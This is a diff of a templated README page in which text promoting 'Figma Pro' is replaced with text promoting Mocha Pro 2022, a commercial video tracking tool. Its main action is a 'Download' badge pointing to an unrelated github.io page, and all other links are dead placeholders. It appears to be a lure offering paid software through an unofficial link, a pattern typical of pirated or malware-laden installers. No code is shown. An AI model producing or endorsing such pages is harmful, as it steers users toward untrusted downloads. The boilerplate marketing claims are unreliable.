@@ -1,72 +1,70 @@
-# Figma Pro – Design and Prototyping Tool
+# Mocha Pro 2022 – Planar Tracking Software
 
 <p align="center">
-  <img src="https://images.icon-icons.com/3053/PNG/512/figma_macos_bigsur_icon_190183.png" width="200" alt="Figma Pro icon"/>
+  <img src="https://www.nmav.de/media/image/product/4494/lg/mocha-pro-multi-host.jpg" width="200" alt="Mocha Pro 2022 icon"/>
 </p>
 
 <p align="center">
-  <a href="https://one-clouder.github.io/.github/figmapro">
-    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Figma Pro"/>
+  <a href="https://one-clouder.github.io/.github/mochapro2022">
+    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Mocha Pro 2022"/>
   </a>
 </p>
 
 <p align="center">
-  <img src="https://s3-alpha.figma.com/hub/file/1243243882/95357450-64c5-48cd-848d-b833bdc4961a-cover.png" alt="Figma Pro screenshot"/>
+  <img src="https://borisfx-com-res.cloudinary.com/image/upload/q_auto,f_auto,fl_lossy/v1682422008/products/MochaPro2023-new-webpage-ROI-02.jpg" alt="Mocha Pro 2022 screenshot"/>
 </p>
 
 ---
 
 ## Overview
 
-<a href="#">Figma Pro</a> delivers professional design capabilities through a platform that has revolutionized how design teams work together. Unlike traditional desktop applications, Figma operates in the browser while providing performance comparable to native tools. This architecture enables revolutionary real-time collaboration where teams design together regardless of location. The platform has become the industry standard for product design, used by organizations from startups to Fortune 500 companies.
+<a href="#">Mocha Pro 2022</a> delivers Academy Award-winning tracking technology through an interface refined over years of professional production use. This software has become the industry standard for planar tracking, rotoscoping, and object removal, used on virtually every major Hollywood production and countless television shows, commercials, and music videos. The technology earned recognition with an Academy Award for its contribution to visual effects, and continues evolving to address the most challenging post-production scenarios.
 
-<a href="#">Real-time collaboration</a> distinguishes Figma from all previous design tools. Multiple designers can work on the same file simultaneously, seeing each other's cursors and changes instantly. This eliminates the version control nightmares that plagued design teams for decades. Comments and feedback happen directly on designs. The collaboration extends to stakeholders who can observe progress without design software expertise. This shared workspace transforms design from solitary work into team sport.
+<a href="#">Planar tracking</a> represents Mocha's core innovation and the foundation for all its tools. Unlike point trackers that follow individual features, planar tracking analyzes how entire surfaces move through perspective changes. This approach proves far more robust when individual features become occluded, move off-frame, or change appearance. The algorithm identifies planes in footage and calculates their transformation through shear, rotation, scale, and perspective changes. This data then drives compositing, rotoscoping, and stabilization with unprecedented accuracy.
 
-The <a href="#">vector editing tools</a> provide everything needed for interface design. The pen tool creates custom shapes with bezier precision. Boolean operations combine shapes through union, subtract, intersect, and exclude. Corner radius controls on rectangles enable consistent UI elements. The vector network allows more complex node relationships than traditional paths. These tools handle everything from precise icons to complex illustrations.
+The <a href="#">planar surface</a> concept extends beyond obvious flat objects. Walls, floors, sides of vehicles, human torsos, and even slightly curved surfaces all exhibit planar motion characteristics that Mocha can track. The tracker handles partial occlusions by analyzing visible portions of tracked surfaces. Multiple planar layers can be tracked simultaneously, with Mocha automatically handling their depth relationships. This flexibility enables tracking scenarios that defeat simpler tools.
 
-<a href="#">Auto Layout</a> revolutionizes how designers create responsive components. Rather than manually positioning elements, Auto Layout containers manage spacing and alignment automatically. Contents can flow horizontally or vertically. Padding and gaps maintain consistent spacing. Components resize intelligently when content changes. This system mirrors how developers build with flexbox and CSS, improving design-development alignment.
+<a href="#">Rotoscoping tools</a> in Mocha Pro combine freehand drawing with spline mathematics for efficient matte creation. The X-Spline and Bezier tools create smooth, controllable shapes. Magnetic spline options snap to edges automatically, accelerating initial shape creation. The layer-based workflow organizes complex roto tasks, while the timeline provides keyframe control over shape changes. Mocha's rotoscoping benefits enormously from its tracking foundation, as tracked shapes follow motion automatically.
 
-The <a href="#">component system</a> enables consistent, scalable design. Components act as masters that propagate changes to all instances. Variants organize related components with different states or sizes. Component properties enable customization without breaking inheritance. Nested components build complex elements from simpler parts. This system enables design systems that maintain consistency across products and teams.
+<a href="#">Shape behavior</a> options determine how roto shapes respond to tracking data. Link to Track mode connects shapes to specific tracked surfaces, so shapes follow motion automatically. The animator only needs to adjust shapes when the subject's outline changes relative to the tracked surface. This dramatically reduces keyframe requirements compared to frame-by-frame rotoscoping. Multiple shapes can link to different tracked layers for complex subjects.
 
-<a href="#">Design Tokens</a> and styles centralize visual decisions. Colors, typography, effects, and grids can be defined once and applied throughout designs. Changes to styles update all uses automatically. Style libraries can be shared across files and teams. This centralization ensures consistency and enables efficient updates. The system supports complex organizations with multiple brands or products.
+The <a href="#">Remove module</a> automates object removal through temporal frame analysis. Rather than requiring clean plates, Remove analyzes footage over time to reconstruct backgrounds behind unwanted objects. The tracked matte defines what to remove, and Remove fills the area with appropriate background content. The module handles moving cameras and dynamic backgrounds that would be impossible to paint out manually. Foreground holdouts prevent important elements from being removed.
 
-The <a href="#">prototyping capabilities</a> transform static designs into interactive experiences. Connections between frames define navigation flows. Transition animations add polish and indicate interactions. Smart animate interpolates between frame states. Scroll behaviors demonstrate long content handling. Device frames show designs in context. These prototypes communicate design intent better than specifications alone.
+<a href="#">Clean Plate workflow</a> in the Remove module enables hybrid approaches. Artists can provide painted clean plates for specific frames, and Remove interpolates between them for surrounding frames. This handles situations where automatic removal needs guidance. The clean plate can be created directly in Mocha or painted externally. Progressive refinement enables starting with automatic removal and adding clean plates only where needed.
 
-<a href="#">Interactive components</a> enable prototyping with realistic behavior. Hover, pressed, and other states can be defined within components. Prototypes automatically use appropriate states during interaction. This enables realistic button feedback, menu behaviors, and form interactions. The result is prototypes that feel like real products rather than slideshows.
+<a href="#">Stabilization</a> in Mocha Pro provides multiple modes for different needs. Smooth options reduce shake while preserving intentional camera motion. Lock modes eliminate all motion for rock-solid footage. Geometry stabilization handles perspective changes that shift-based stabilizers cannot correct. The stabilization data can export to host applications for processing there, or render can happen directly within Mocha.
 
-The <a href="#">developer handoff</a> features bridge design and implementation. Inspect mode provides specifications for any element. CSS, iOS, and Android code snippets accelerate implementation. Asset export handles multiple resolutions and formats. Links enable developers to access designs without accounts. This handoff reduces implementation time and improves accuracy.
+The <a href="#">3D camera solver</a> extracts actual camera motion from footage for proper CGI integration. The solver analyzes tracked planar surfaces to calculate camera position, rotation, and lens characteristics over time. This data exports in formats compatible with major 3D applications and compositing software. The resulting camera move enables CGI elements to be added that match the original photography precisely. Adjustable solve parameters handle various footage characteristics.
 
-<a href="#">Plugins</a> extend Figma's capabilities infinitely. The community has created thousands of plugins for accessibility checking, content population, animation, and countless specialized tasks. The plugin API enables custom tooling for specific workflows. Organizations build internal plugins for proprietary processes. This extensibility means Figma grows with your needs.
+<a href="#">Lens module</a> analyzes and corrects lens distortion for accurate tracking and effects work. Wide-angle and anamorphic distortion gets measured and removed, enabling clean tracking of warped footage. The correction can be applied permanently or used non-destructively within the tracking pipeline. Lens data exports for use in other applications, ensuring consistent distortion handling throughout the pipeline.
 
-The <a href="#">team features</a> in Figma Pro support professional workflows. Unlimited projects organize work by product or initiative. Team libraries share components and styles across projects. Permissions control who can view and edit. Activity logs track changes for accountability. These features support design at organizational scale.
+<a href="#">Insert module</a> renders tracked graphics directly within Mocha. Imported images or video get corner-pinned onto tracked surfaces with appropriate motion blur and mesh warping. This enables quick preview of graphics replacements without exporting to other applications. The insert can account for lens distortion and lighting changes for integrated results. Multiple inserts can be rendered in a single pass for efficiency.
 
-<a href="#">FigJam</a> extends collaboration beyond polished designs. This companion tool provides whiteboard-style collaboration for brainstorming, planning, and workshopping. Sticky notes, shapes, and drawing tools support visual thinking. Integration with Figma designs enables fluid workflow from ideation to execution. FigJam sessions can include non-designers comfortably.
+<a href="#">PowerMesh</a> tracking extends planar tracking to deforming surfaces. The tool creates a mesh of planar sub-surfaces that can flex and stretch while maintaining overall tracking coherence. This handles organic surfaces like faces, fabric, and skin that simple planar tracking cannot follow. PowerMesh data can drive warped rotoscope shapes and texture replacements on deforming surfaces.
 
-The <a href="#">desktop app</a> provides native performance while maintaining browser-based collaboration. Designs stay synced with the web version automatically. Offline access enables work without internet. Font access includes local fonts that web browsers can't use. The app feels native while retaining Figma's collaborative foundation.
+<a href="#">Export options</a> send Mocha data to virtually any professional application. Format support includes After Effects, Premiere Pro, Final Cut Pro, DaVinci Resolve, Nuke, Flame, Fusion, and many more. Different export types cover tracking data, shapes, rendered elements, and camera solves. The plugin versions enable working directly within host applications, while standalone Mocha offers the complete interface for complex projects.
 
-<a href="#">Version history</a> protects work and enables exploration. Every change saves automatically with 30-day history. Named versions mark significant milestones. Previous versions can be viewed, duplicated, or restored. Branching enables parallel exploration without risking main designs. This history eliminates fear of irreversible mistakes.
-
-<a href="#">Enterprise features</a> address organizational requirements. Single sign-on integrates with corporate identity systems. Advanced permissions manage access at scale. Admin analytics provide usage insights. Design system analytics show component adoption. These features support design operations in large organizations.
+<a href="#">GPU acceleration</a> enables interactive performance with complex projects. Tracking, removal, and rendering all benefit from GPU processing. Metal implementation on macOS maximizes Apple Silicon performance. The acceleration transforms workflow by enabling real-time feedback during challenging operations. Preview rendering happens in the background without blocking other work.
 
 ---
 
 ## Key Features
 
-- <a href="#">Real-time collaboration</a>
-- <a href="#">Vector editing</a> powerful
-- <a href="#">Auto Layout</a> responsive
-- <a href="#">Components</a> and variants
-- <a href="#">Design Tokens</a> styles
-- <a href="#">Prototyping</a> interactive
-- <a href="#">Developer handoff</a>
-- <a href="#">Plugins</a> extensible
-- <a href="#">Version history</a>
+- <a href="#">Planar tracking</a> industry-leading
+- <a href="#">Rotoscoping tools</a>
+- <a href="#">Object removal</a> automated
+- <a href="#">Stabilization</a> multiple modes
+- <a href="#">3D camera solver</a>
+- <a href="#">PowerMesh</a> deforming surfaces
+- <a href="#">Lens module</a>
+- <a href="#">Insert module</a>
+- <a href="#">GPU acceleration</a>
 
 ---
 
 ## Additional Information
 
-Figma Pro distinguishes itself through unwavering commitment to quality and user experience excellence. Rather than compromising platform integration for cross-compatibility, development focuses exclusively on delivering authentic native operation.
+Mocha Pro 2022 distinguishes itself through unwavering commitment to quality and user experience excellence. Rather than compromising platform integration for cross-compatibility, development focuses exclusively on delivering authentic native operation.
 
 Users appreciate the application's predictable behavior and minimal maintenance requirements, characteristics that prove invaluable in professional settings where downtime creates costly disruptions.
 
